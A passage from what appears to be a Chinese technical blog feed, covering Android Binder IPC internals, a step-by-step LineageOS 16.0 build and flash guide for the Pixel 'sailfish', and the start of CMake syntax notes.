<li><p>对于每一个 <code>service</code> 组件，内核都会创建一个 <code>binder node</code> 与之对应。用户空间通过 <code>flat_binder_object</code> 这个数据结构把本次要注册的 <code>service</code> 组件扁平化，传递给 <code>binder</code> 驱动。驱动根据这个 <code>flat_binder_object</code> 创建并初始化了该 <code>service</code> 组件对应的 <code>binder node</code> 。由于是注册到 <code>service manager</code> ，也就是说 <code>service manager</code> 会有一个对本次注册组件的引用，所以需要在 <code>target proc</code>（即 <code>service manager</code> ）中建立一个 <code>binder ref</code> 对象（指向这个要注册的 <code>binder</code> 实体）并分配一个 <code>handle</code> 。</p>
</li>
<li><p>把一个 <code>BINDER_WORK_TRANSACTION_COMPLETE</code> 类型的 <code>binder work</code> 挂入 <code>client binder thread</code> 的 <code>todo list</code> ，通知 <code>client</code> 其请求的 <code>transaction</code> 已经被 <code>binder</code> 处理完毕，可以进行其他工作了（当然对于同步 <code>binder</code> 通信， <code>client</code> 一般会通过 <code>read</code> 类型的 <code>ioctl</code> 进入阻塞态，等待 <code>server</code> 端的回应）。</p>
</li>
<li><p>至此， <code>client</code> 端已经完成了所有操作，现在我们开始进入 <code>server</code> 端的数据流了。 <code>Binder</code> 驱动会把一个 <code>BINDER_WORK_TRANSACTION</code> 类型的 <code>binder work</code> （内嵌在 <code>binder transaction</code> ）挂入 <code>binder</code> 线程的 <code>todo list</code> ，然后唤醒它起来干活。</p>
</li>
<li><p><code>binder server</code> 端会使用 <code>ioctl</code> （ <code>BINDER_WRITE_READ</code> ）进入读阻塞状态，等待 <code>client</code> 的请求到来。一旦有请求到来，<code>Service manager</code> 进程会从 <code>binder_thread_read</code> 中醒来处理队列上的 <code>binder work</code> 。所谓处理 <code>binder work</code> 其实完成 <code>client transaction</code> 的向上递交过程。具体的<code>transaction</code> 数据封装在 <code>struct binder_write_read</code> 对象中，具体如下图所示：</p>
</li>
</ol>
<img src="/2020/08/24/Binder%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%EF%BC%88%E7%BB%86%E8%8A%82%E7%AF%87%EF%BC%89/2020-08-24-12-48-47.png" class="">

<p>需要强调的一点是：在步骤2中， <code>flat_binder_object</code> 传递的是 <code>binder node</code> ，而这里传递的是 <code>handle</code> （即 <code>binder ref</code> ，步骤4中创建的）</p>
<ol>
<li><p>在 <code>Service manager</code> 进程的用户态，识别了本次 <code>transaction</code> 的 <code>code</code> 是 <code>add service</code> ，那么它会把（ <code>service name</code> ， <code>handle</code> ）数据写入其数据库，完成服务注册。</p>
</li>
<li><p>从 <code>transaction</code> 的角度看，上半场已经完成。现在开始下半场的 <code>transaction</code> 的处理，即 <code>BC_REPLY</code> 的处理。和 <code>BC_TRANSACTION</code> 处理类似，也是通过 <code>binder_ioctl ---&gt; binder_ioctl_write_read ---&gt; binder_thread_write ---&gt; binder_transaction</code> 这个调用链条进入 <code>binder transaction</code> 处理流程的。</p>
</li>
<li><p>和上半场类似，在这里 <code>Binder</code> 驱动同样会创建一个 <code>binder_transaction</code> 对象来控制完成本次 <code>BC_REPLY</code> 的 <code>binder transaction</code> 。通过 <code>thread-&gt;transaction_stack</code> 可以找到其对应的 <code>BC_TRANSACTION</code> 的 <code>binder transaction</code> 对象，进而找到回应给哪一个 <code>binder process</code> 和 <code>thread</code> 。后续的处理和上半场类似，这里就不再赘述了。</p>
</li>
</ol>
<h2 id="3-相关数据结构"><a href="#3-相关数据结构" class="headerlink" title="3. 相关数据结构"></a>3. 相关数据结构</h2><p><code>struct transaction</code>主要用来表示 <code>binder client</code> 和 <code>server</code> 之间的一次通信，该数据结构的主要成员如下表所示：</p>
<table>
<thead>
<tr>
<th>成员变量</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>work</td>
<td>本次 transaction 涉及的 binder work ，它会挂入 target proc 或者 target binder thread 的 todo list 中。</td>
</tr>
<tr>
<td>from</td>
<td>发起 binder 通信的线程</td>
</tr>
<tr>
<td>to_proc</td>
<td>处理 binder 请求的进程</td>
</tr>
<tr>
<td>to_thread</td>
<td>处理 binder 请求的线程</td>
</tr>
<tr>
<td>buffer</td>
<td>binder 通信使用的 buffe r，当 A 向 B 服务请求 binder 通信的时候， B 进程分配 buffer ，并 copy A 的数据（ user space ）到 buffer 中。<strong>这是 binder 通信唯一一次内存拷贝。</strong></td>
</tr>
<tr>
<td>code</td>
<td>本次 transaction 的操作码。 Binder server 端根据操作码提供相应的服务</td>
</tr>
<tr>
<td>flags</td>
<td>本次 transaction 的一些属性标记</td>
</tr>
<tr>
<td>Priority saved_priority</td>
<td>和优先级处理相关的成员</td>
</tr>
</tbody></table>
<p> <code>BC_TRANSACTION</code> 、 <code>BC_REPLY</code> 、 <code>BR_TRANSACTION</code> 和 <code>BR_REPLY</code> 这四个协议码的协议数据是 <code>struct binder_transaction_data</code> ，该数据结构的主要成员如下表所示：</p>
<table>
<thead>
<tr>
<th>成员变量</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>target</td>
<td>本次 transation 去向何方？ Target 有两种形式，一种是本地 binder 实体，另外一种是表示远端 binder 实体的句柄。在 client 向 service manager 发起 transaction 的时候，那么 target.handle 等于 0 。当该 transaction 到达 service manager 的时候， binder 实体变成本地对象，因此用 Target.ptr 和 cookie 来表示。</td>
</tr>
<tr>
<td>cookie</td>
<td>如果 transaction 的目的地是本地 binder 实体，那么这个成员保存了 binder 实体对象的用户空间地址</td>
</tr>
<tr>
<td>code</td>
<td>Client 和 service 组件之间的操作码， binder 驱动不关心这个码字。</td>
</tr>
<tr>
<td>flags</td>
<td>描述 transaction 特性的 flag 。例如 TF_ONE_WAY 说明是同步还是异步 binder 通信</td>
</tr>
<tr>
<td>sender_pid sender_euid</td>
<td>是谁发起 transaction ？在 binder 驱动中会根据当前线程设定。</td>
</tr>
<tr>
<td>data_size offsets_size data</td>
<td>本次 transaction 的数据缓冲区信息。</td>
</tr>
</tbody></table>
<p><code>flat_binder_object</code> 主要用来在进程之间传递 <code>Binder</code> 对象，该数据结构的主要成员如下表所示：</p>
<table>
<thead>
<tr>
<th>成员变量</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>hdr</td>
<td>用来描述 Binder 对象的类型，目前支持的类型有： binder 实体（本地 service 组件） Binder 句柄（远端的 service 组件） 文件描述符 本文主要关注前两种对象类型</td>
</tr>
<tr>
<td>Binder handle</td>
<td>如果 flat_binder_object 传递的是本地 service 组件，那么这个联合体中的 binder 成员有效，指向本地 service 组件（用户空间对象）的一个弱引用对象的地址。 如果 flat_binder_object 传递的是句柄，那么这个联合体中的 handle 成员有效，该 handle 对应的 binder ref 指向一个 binder 实体对象。</td>
</tr>
<tr>
<td>cookie</td>
<td>如果传递的是 binder 实体，那么这个成员保存了 binder 实体对象（ service 组件）的用户空间地址</td>
</tr>
</tbody></table>
<p><code>struct binder_ref</code> 主要用来表示一个对 <code>Binder</code> 实体对象（ <code>binder node</code> ）的引用，该数据结构的主要成员如下表所示：</p>
<table>
<thead>
<tr>
<th>成员变量</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>data</td>
<td>这个成员最核心的数据是用户空间的句柄</td>
</tr>
<tr>
<td>rb_node_desc</td>
<td>挂入 binder proc 的红黑树（ key 是描述符， userspace 的句柄）</td>
</tr>
<tr>
<td>rb_node_node</td>
<td>挂入 binder proc 的红黑树（ key 是 binder node ）</td>
</tr>
<tr>
<td>node_entry</td>
<td>挂入 binder node 的哈希表</td>
</tr>
<tr>
<td>proc</td>
<td>该 binder ref 属于哪一个 binder  proc</td>
</tr>
<tr>
<td>node</td>
<td>该 binder ref 引用哪一个 binder node</td>
</tr>
</tbody></table>
<h1 id="四、如何和-Service-组件通信"><a href="#四、如何和-Service-组件通信" class="headerlink" title="四、如何和 Service 组件通信"></a>四、如何和 Service 组件通信</h1><p>我们以 B 进程向 A 服务组件（位于 A 进程）发起服务请求为例来说明具体的操作流程。 B 进程不能直接请求 A 服务组件的服务，因为 B 进程唯一获知的信息是 A 服务组件的名字而已。由于 A 服务组件已经注册在案，因此 <code>service manager</code> 已经有（ A 服务组件名字，句柄）的记录，因此 B 进程可以通过下面的流程获得 A 服务组件的信息并建立其代理组件对象：</p>
<img src="/2020/08/24/Binder%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%EF%BC%88%E7%BB%86%E8%8A%82%E7%AF%87%EF%BC%89/2020-08-24-12-54-56.png" class="">

<p>B 进程首先发起 <code>BC_TRANSACTION</code> 操作，操作码是 <code>CHECK_SERVICE</code> ，数据是 A 服务组件的名字。 <code>Service manager</code> 找到了句柄后将其封装到 <code>BC_REPLY</code> 中。这里的句柄是 <code>service manager</code> 进程的句柄，这个句柄并不能直接被 B 进程直接使用，毕竟（进程，句柄）才对应唯一的 <code>binder</code> 实体。这里的 <code>binder driver</code> 有一个很关键的操作：把 <code>service manager</code> 中句柄 A 转换成 <code>B client</code> 进程中的句柄 B ，并封装在 <code>BR_REPLY</code> 中。这时候（ <code>service manager</code> 进程，句柄 A ）和（ <code>B client</code> 进程，句柄 B ）都指向 A 服务组件对应的 <code>bind node</code> 对象。</p>
<p>一旦定位了 A 服务组件，那么可以继续进行如下的流程：</p>
<img src="/2020/08/24/Binder%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%EF%BC%88%E7%BB%86%E8%8A%82%E7%AF%87%EF%BC%89/2020-08-24-12-55-26.png" class="">

<h1 id="五、Binder内存操作"><a href="#五、Binder内存操作" class="headerlink" title="五、Binder内存操作"></a>五、Binder内存操作</h1><h2 id="1-逻辑过程"><a href="#1-逻辑过程" class="headerlink" title="1.逻辑过程"></a>1.逻辑过程</h2><p>在处理 <code>binder transaction</code> 的过程中，相关的内存操作如下所示：</p>
<img src="/2020/08/24/Binder%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%EF%BC%88%E7%BB%86%E8%8A%82%E7%AF%87%EF%BC%89/2020-08-24-12-55-48.png" class="">

<p>配合上面的流程，内存操作的逻辑过程如下：</p>
<ol>
<li><p>在 <code>binder client</code> 的用户空间中，发起 <code>transaction</code> 的一方会构建用户数据缓冲区（包括两部分：实际的数据区和 <code>offset</code> 区），把想要传递到 <code>server</code> 端的数据填充到缓冲区并封装在 <code>binder_transaction_data</code> 数据结构中。</p>
</li>
<li><p><code>binder_transaction_data</code> 会被 <code>copy</code> 到内核态， <code>binder</code> 驱动会根据它计算出本次需要 <code>binder</code> 通信的数据量。</p>
</li>
<li><p>根据 <code>binder</code> 通信的数据量在 <code>server</code> 进程的 <code>binder VMA</code> 分配数据缓冲区（ <code>binder buffer</code> 是这个缓冲区的控制数据对象），同时根据需要也会分配对应的物理 <code>page</code> 并建立地址映射，以便用户空间可以访问这段 <code>buffer</code> 的数据。</p>
</li>
<li><p>建立内核地址空间的映射，把用户空间的 <code>binder</code> 数据缓冲区拷贝到内核中，然后释放掉该映射。</p>
</li>
<li><p>在把 <code>binder buffer</code> 的数据传递到 <code>server</code> 用户空间的时候，我们需要一个 <code>binder_transaction_data</code> 来描述 <code>binder</code> 通信的缓冲区数据，这个数据对象需要拷贝到用户地址空间，而 <code>binder buffer</code> 中的数据则不需要拷贝，因为在上面步骤3中已经建立了地址映射， <code>server</code> 进程可以直接访问即可。</p>
</li>
</ol>
<h2 id="2-主要的数据结构"><a href="#2-主要的数据结构" class="headerlink" title="2.主要的数据结构"></a>2.主要的数据结构</h2><p><code>struct binder_alloc</code> 用来描述 <code>binder</code> 进程内存分配器，该数据结构的主要成员如下表所示：</p>
<table>
<thead>
<tr>
<th>成员变量</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>vma</td>
<td>binder 内存对应的 VMA</td>
</tr>
<tr>
<td>vma_vm_mm</td>
<td>binder 进程对应的地址空间描述符</td>
</tr>
<tr>
<td>buffer</td>
<td>该 binder proc 能用于 binder 通信的内存地址。该地址是 mmap 的用户空间虚拟地址。</td>
</tr>
<tr>
<td>buffers</td>
<td>所有的 binder buffers （包括空闲的和正在使用的）</td>
</tr>
<tr>
<td>free_buffers</td>
<td>空闲 binder buffers 的红黑树，按照 size 排序</td>
</tr>
<tr>
<td>allocated_buffers</td>
<td>已经分配的 binder buffers 的红黑树， key 是 buffer address</td>
</tr>
<tr>
<td>free_async_space</td>
<td>剩余的可用于异步 binder 通信的内存大小。初始化的时候配置为 2M （整个 binder 内存的一半）</td>
</tr>
<tr>
<td>pages</td>
<td>binder 内存区域对应的 page 们。在 reclaim binder 内存的时候</td>
</tr>
<tr>
<td>buffer_size</td>
<td>通过 mmap 映射的，用于 binder 通信的缓冲区大小，即 binder alloc 管理的整个内存的大小。</td>
</tr>
<tr>
<td>pid</td>
<td>Binder proc 的pid</td>
</tr>
</tbody></table>
<p><code>struct binder_buffer</code> 用来描述一个用于 <code>binder</code> 通信的缓冲区，该数据结构的主要成员如下表所示：</p>
<table>
<thead>
<tr>
<th>成员变量</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>entry</td>
<td>挂入 binder alloc buffer 链表（ buffers 成员）的节点</td>
</tr>
<tr>
<td>rb_node</td>
<td>挂入 binder alloc 红黑树的节点：如果是空闲的 buffer ，挂入空闲红黑树，如果是已经分配的，挂入已分配红黑树。</td>
</tr>
<tr>
<td>transaction</td>
<td>Binder 缓冲区都是用于某次 binder transaction 的，这个成员指向对应的 transaction 。</td>
</tr>
<tr>
<td>target_node</td>
<td>该 buffer 的去向哪一个 node （ service 组件）</td>
</tr>
<tr>
<td>data_size offsets_size</td>
<td>Binder 缓冲区的数据区域的大小以及 offset 区域的大小。</td>
</tr>
<tr>
<td>user_data</td>
<td>该 binder buffer 的用户空间地址</td>
</tr>
</tbody></table>
<p>参考文献：</p>
<p>[1]Android系统源代码情景分析，罗升阳著</p>
<p>[2]<a href="http://gityuan.com/tags/#binder">http://gityuan.com/tags/#binder</a> ，袁辉辉的博客</p>
]]></content>
      <categories>
        <category>Android源码</category>
      </categories>
      <tags>
        <tag>Android源码阅读</tag>
      </tags>
  </entry>
  <entry>
    <title>Build lineage-16.0 for sailfish</title>
    <url>/2020/06/05/Build-lineage-16-0-for-sailfish/</url>
    <content><![CDATA[<blockquote>
<p>系统环境：Ubuntu 18.04.3</p>
<p>编译Android系统版本： lineage-16.0</p>
</blockquote>
<h1 id="配置安装平台工具"><a href="#配置安装平台工具" class="headerlink" title="配置安装平台工具"></a>配置安装平台工具</h1><h2 id="安装-adb-和-fastboot-，-可以从谷歌下载它们。提取运行："><a href="#安装-adb-和-fastboot-，-可以从谷歌下载它们。提取运行：" class="headerlink" title="安装 adb 和 fastboot ， 可以从谷歌下载它们。提取运行："></a>安装 <code>adb</code> 和 <code>fastboot</code> ， 可以从<a href="https://dl.google.com/android/repository/platform-tools-latest-linux.zip">谷歌下载</a>它们。提取运行：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unzip platform-tools-latest-linux.zip -d ~</span><br></pre></td></tr></table></figure>

<p>添加 <code>adb</code> 和 <code>fastboot</code> 到 <code>PATH</code> 。打开 <code>~/.profile</code> 并添加以下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># add Android SDK platform tools to path</span><br><span class="line">if [ -d &quot;$HOME/platform-tools&quot; ] ; then</span><br><span class="line">    PATH=&quot;$HOME/platform-tools:$PATH&quot;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
<p>然后，运行 <code>source ~/.profile</code> 以更新环境。</p>
<h1 id="配置必须的环境"><a href="#配置必须的环境" class="headerlink" title="配置必须的环境"></a>配置必须的环境</h1><h2 id="安装必须的库"><a href="#安装必须的库" class="headerlink" title="安装必须的库"></a>安装必须的库</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bc bison build-essential ccache curl flex g++-multilib gcc-multilib git gnupg gperf imagemagick lib32ncurses5-dev lib32readline-dev lib32z1-dev liblz4-tool libncurses5 libncurses5-dev libsdl1.2-dev libssl-dev libxml2 libxml2-utils lzop pngcrush rsync schedtool squashfs-tools xsltproc zip zlib1g-dev</span><br></pre></td></tr></table></figure>

<p>对于 20.04 之前的Ubuntu版本，需要安装：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">libwxgtk3.0-dev</span><br></pre></td></tr></table></figure>

<p>对于早于 16.04 的Ubuntu版本，请安装：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">libwxgtk2.8-dev</span><br></pre></td></tr></table></figure>

<h2 id="JDK"><a href="#JDK" class="headerlink" title="JDK"></a>JDK</h2><ul>
<li>LineageOS 16.0：OpenJDK 1.9（默认包含）</li>
<li>LineageOS 14.1-15.1：OpenJDK 1.8（安装openjdk-8-jdk）</li>
<li>LineageOS 11.0-13.0：OpenJDK 1.7（安装openjdk-7-jdk）*</li>
</ul>
<h1 id="下载源码"><a href="#下载源码" class="headerlink" title="下载源码"></a>下载源码</h1><h2 id="创建目录"><a href="#创建目录" class="headerlink" title="创建目录"></a>创建目录</h2><p>创建构建环境中设置一些目录：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir -p ~/bin</span><br><span class="line">mkdir -p ~/android/lineage</span><br></pre></td></tr></table></figure>
<h2 id="安装-repo-命令"><a href="#安装-repo-命令" class="headerlink" title="安装 repo 命令"></a>安装 repo 命令</h2><p>输入以下内容以下载 repo 二进制文件并使其可执行（可运行）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl https://storage.googleapis.com/git-repo-downloads/repo &gt; ~/bin/repo</span><br><span class="line">chmod a+x ~/bin/repo</span><br></pre></td></tr></table></figure>

<p>将 <code>~/bin</code> 目录放在执行路径中，打开 <code>~/.profile</code> 文件，添加下列代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># set PATH so it includes user&#x27;s private bin if it exists</span><br><span class="line">if [ -d &quot;$HOME/bin&quot; ] ; then</span><br><span class="line">    PATH=&quot;$HOME/bin:$PATH&quot;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
<p>然后，运行 <code>source ~/.profile</code> 以更新环境。</p>
<h2 id="配置git"><a href="#配置git" class="headerlink" title="配置git"></a>配置git</h2><p>运行以下命令来配置git身份：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git config --global user.email &quot;you@example.com&quot;</span><br><span class="line">git config --global user.name &quot;Your Name&quot;</span><br></pre></td></tr></table></figure>

<h2 id="初始化LineageOS源并下载源代码"><a href="#初始化LineageOS源并下载源代码" class="headerlink" title="初始化LineageOS源并下载源代码"></a>初始化LineageOS源并下载源代码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd ~/android/lineage</span><br><span class="line">repo init -u https://github.com/LineageOS/android.git -b lineage-16.0</span><br><span class="line"></span><br><span class="line">repo sync</span><br></pre></td></tr></table></figure>

<h1 id="准备特定于设备的代码"><a href="#准备特定于设备的代码" class="headerlink" title="准备特定于设备的代码"></a>准备特定于设备的代码</h1><p>源代码下载后，确保您位于源代码的根目录 ( cd ~&#x2F;android&#x2F;lineage)，然后键入：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> build/envsetup.sh</span><br><span class="line">breakfast sailfish</span><br></pre></td></tr></table></figure>
<p>这将下载您设备的<a href="https://github.com/LineageOS/android_device_google_sailfish">设备特定配置</a>和 <a href="https://github.com/LineageOS/android_kernel_google_marlin">内核</a>。</p>
<blockquote>
<p>有一些设备需要在 breakfast 之前准备好 vendor 目录 如果出现错误，按下面的方法提取专有 Blob，推荐使用 通过修改 <code>.repo/local_manifests/*.xml</code> 文件进行提取 。</p>
</blockquote>
<h2 id="提取专有Blob"><a href="#提取专有Blob" class="headerlink" title="提取专有Blob"></a>提取专有Blob</h2><h3 id="通过-extract-files-sh-脚本提取（不推荐）"><a href="#通过-extract-files-sh-脚本提取（不推荐）" class="headerlink" title="通过 extract_files.sh 脚本提取（不推荐）"></a>通过 <code>extract_files.sh</code> 脚本提取（不推荐）</h3><p>确保您的 Pixel 已通过 USB 电缆连接到计算机，并且已启用 ADB 和 root 身份，并且位于 <code>~/android/lineage/device/google/sailfish</code> 文件夹中。然后运行 <code>extract-files.sh</code>脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./extract-files.sh</span><br></pre></td></tr></table></figure>
<p>Blob 应被拉入 <code>~/android/lineage/vendor/google</code> 文件夹。</p>
<h3 id="通过修改-repo-local-manifests-xml-文件进行提取-推荐"><a href="#通过修改-repo-local-manifests-xml-文件进行提取-推荐" class="headerlink" title="通过修改 .repo/local_manifests/*.xml 文件进行提取(推荐)"></a>通过修改 <code>.repo/local_manifests/*.xml</code> 文件进行提取(推荐)</h3><p>在 <code>.repo/local_manifests/roomservice.xml</code> 文件中添加下列代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;project clone-depth=&quot;1&quot; name=&quot;TheMuppets/proprietary_vendor_google&quot; path=&quot;vendor/google&quot; remote=&quot;github&quot; /&gt;</span><br></pre></td></tr></table></figure>
<p>最终代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;manifest&gt;</span><br><span class="line">  &lt;project name=&quot;LineageOS/android_device_google_sailfish&quot; path=&quot;device/google/sailfish&quot; remote=&quot;github&quot; /&gt;</span><br><span class="line">  &lt;project name=&quot;LineageOS/android_device_google_marlin&quot; path=&quot;device/google/marlin&quot; remote=&quot;github&quot; /&gt;</span><br><span class="line">  &lt;project name=&quot;LineageOS/android_kernel_google_marlin&quot; path=&quot;kernel/google/marlin&quot; remote=&quot;github&quot; /&gt;</span><br><span class="line">  &lt;project clone-depth=&quot;1&quot; name=&quot;TheMuppets/proprietary_vendor_google&quot; path=&quot;vendor/google&quot; remote=&quot;github&quot; /&gt;</span><br><span class="line">&lt;/manifest&gt;</span><br></pre></td></tr></table></figure>
<p>然后执行 <code>repo sync</code> ， 最终将会 <code>~/android/lineage/vendor/google</code> 文件夹如下所示：</p>
<img src="/2020/06/05/Build-lineage-16-0-for-sailfish/2020-06-07-11-17-46.png" class="">



<h1 id="开始编译"><a href="#开始编译" class="headerlink" title="开始编译"></a>开始编译</h1><h2 id="准备设备特定的代码"><a href="#准备设备特定的代码" class="headerlink" title="准备设备特定的代码"></a>准备设备特定的代码</h2><p>进入 <code>~/android/lineage</code> 目录中，运行下列命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ source build/envsetup.sh  </span><br><span class="line">including device/generic/car/vendorsetup.sh</span><br><span class="line">including device/generic/mini-emulator-arm64/vendorsetup.sh</span><br><span class="line">including device/generic/mini-emulator-armv7-a-neon/vendorsetup.sh</span><br><span class="line">including device/generic/mini-emulator-x86/vendorsetup.sh</span><br><span class="line">including device/generic/mini-emulator-x86_64/vendorsetup.sh</span><br><span class="line">including device/generic/uml/vendorsetup.sh</span><br><span class="line">including device/google/marlin/vendorsetup.sh</span><br><span class="line">including vendor/lineage/vendorsetup.sh</span><br><span class="line">including sdk/bash_completion/adb.bash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ breakfast sailfish</span><br><span class="line">including vendor/lineage/vendorsetup.sh</span><br><span class="line">Looking for dependencies in device/google/sailfish</span><br><span class="line">Looking for dependencies in device/google/marlin</span><br><span class="line">Looking for dependencies in kernel/google/marlin</span><br><span class="line">kernel/google/marlin has no additional dependencies.</span><br><span class="line"></span><br><span class="line">============================================</span><br><span class="line">PLATFORM_VERSION_CODENAME=REL</span><br><span class="line">PLATFORM_VERSION=9</span><br><span class="line">LINEAGE_VERSION=16.0-20200607-UNOFFICIAL-sailfish</span><br><span class="line">TARGET_PRODUCT=lineage_sailfish</span><br><span class="line">TARGET_BUILD_VARIANT=userdebug</span><br><span class="line">TARGET_BUILD_TYPE=release</span><br><span class="line">TARGET_ARCH=arm64</span><br><span class="line">TARGET_ARCH_VARIANT=armv8-a</span><br><span class="line">TARGET_CPU_VARIANT=kryo</span><br><span class="line">TARGET_2ND_ARCH=arm</span><br><span class="line">TARGET_2ND_ARCH_VARIANT=armv8-a</span><br><span class="line">TARGET_2ND_CPU_VARIANT=kryo</span><br><span class="line">HOST_ARCH=x86_64</span><br><span class="line">HOST_2ND_ARCH=x86</span><br><span class="line">HOST_OS=linux</span><br><span class="line">HOST_OS_EXTRA=Linux-5.3.0-53-generic-x86_64-Ubuntu-18.04.4-LTS</span><br><span class="line">HOST_CROSS_OS=windows</span><br><span class="line">HOST_CROSS_ARCH=x86</span><br><span class="line">HOST_CROSS_2ND_ARCH=x86_64</span><br><span class="line">HOST_BUILD_TYPE=release</span><br><span class="line">BUILD_ID=PQ3A.190801.002</span><br><span class="line">OUT_DIR=/media/ckcat/5670d030-468f-f443-9854-3a9e65ef901c/lineage/out</span><br><span class="line">============================================</span><br></pre></td></tr></table></figure>

<h2 id="开始构建"><a href="#开始构建" class="headerlink" title="开始构建"></a>开始构建</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">croot</span><br><span class="line">brunch sailfish</span><br></pre></td></tr></table></figure>
<blockquote>
<p>需要注意的是，如果使用的 ubuntu 20.04 进行编译，会出现 <code>prebuilts/gcc/linux-x86/aarch64/aarch64-linux-android-4.9/bin/aarch64-linux-android-gcc: not found</code> 错误，这是有由于找不到 <code>/usr/bin/python</code> 的原因，此时安装 python 就好。</p>
</blockquote>
<h2 id="安装版本"><a href="#安装版本" class="headerlink" title="安装版本"></a>安装版本</h2><p>假设构建已完成且没有错误（完成后将很明显），请在构建运行的终端窗口中键入以下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd $OUT</span><br></pre></td></tr></table></figure>
<p>在这里，您会找到所有已创建的文件。更具兴趣的两个文件是：</p>
<ul>
<li><p><code>boot.img</code>，这是 LineageOS 引导映像，并包含 recovery-ramdisk 。</p>
</li>
<li><p><code>lineage-17.1-20200605-UNOFFICIAL-sailfish.zip</code>，这是 LineageOS 安装程序包。</p>
</li>
</ul>
<img src="/2020/06/05/Build-lineage-16-0-for-sailfish/2020-06-07-11-23-55.png" class="">

<p>成功!</p>
<h1 id="刷机"><a href="#刷机" class="headerlink" title="刷机"></a>刷机</h1><p>重启手机至 bootloader 模式，刷入 recovery 。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 重启至 bootloader</span></span><br><span class="line">adb reboot bootloader</span><br><span class="line"></span><br><span class="line"><span class="comment"># 刷入 recovery</span></span><br><span class="line">flash boot boot.img</span><br></pre></td></tr></table></figure>
<p>然后重启至 recovery 模式。选择 <strong>Apply update</strong> -&gt; <strong>Apply from ADB</strong> 再执行下列命令刷机。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb sideload lineage-17.1-20220317-UNOFFICIAL-sailfish.zip</span><br></pre></td></tr></table></figure>
<p>如果需要格式化手机内的数据，则需要先选择 <strong>Factory Reset</strong> -&gt; <strong>Format data&#x2F;factory reset</strong> -&gt; <strong>Format data</strong> ，等待格式化完成，最后再安装上面的方式刷入系统即可。 </p>
<p>参考：</p>
<blockquote>
<p><a href="https://wiki.lineageos.org/devices/sailfish/build">https://wiki.lineageos.org/devices/sailfish/build</a><br><a href="https://www.reddit.com/r/LineageOS/comments/bjo6v3/error_building_lineageos/">https://www.reddit.com/r/LineageOS/comments/bjo6v3/error_building_lineageos/</a><br><a href="https://wiki.lineageos.org/devices/sailfish/install">https://wiki.lineageos.org/devices/sailfish/install</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Android源码</category>
      </categories>
      <tags>
        <tag>Android系统编译</tag>
      </tags>
  </entry>
  <entry>
    <title>CMake的使用记录</title>
    <url>/2020/06/11/CMake%E7%9A%84%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="基本结构"><a href="#基本结构" class="headerlink" title="基本结构"></a>基本结构</h1><ul>
<li><p>依赖CMakeLists.txt文件，项目主目标一个，主目录中可指定包含的子目录；</p>
</li>
<li><p>在项目CMakeLists.txt中使用project指定项目名称，add_subdirectory添加子目录</p>
</li>
<li><p>子目录CMakeLists.txt将从父目录CMakeLists.txt继承设置（TBD，待检验）</p>
</li>
</ul>
<h1 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h1><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>使用 <code>#</code> 表示注释</p>
<h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>使用 <code>set</code> 命令显式定义及赋值, 在非 <code>if</code> 语句中, 使用 <code>$&#123;&#125;</code> 引用, <code>if</code> 中直接使用变量名引用; 后续的 <code>set</code> 命令会清理变量原来的值, 例如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set(var a;b;c) &lt;=&gt; set(var a b c)  #定义变量var并赋值为a;b;c这样一个string list</span><br><span class="line">set(var a) # 赋值var变量的值为a</span><br><span class="line">add_executable($&#123;var&#125;) &lt;=&gt; Add_executable(a b c)   #变量使用$&#123;xxx&#125;引用</span><br></pre></td></tr></table></figure>

<h2 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(var) # var 非empty 0 N No OFF FALSE... #非运算使用NOT</span><br><span class="line">...</span><br><span class="line">else()/elseif()</span><br><span class="line">...</span><br><span class="line">endif(var)</span><br></pre></td></tr></table></figure>

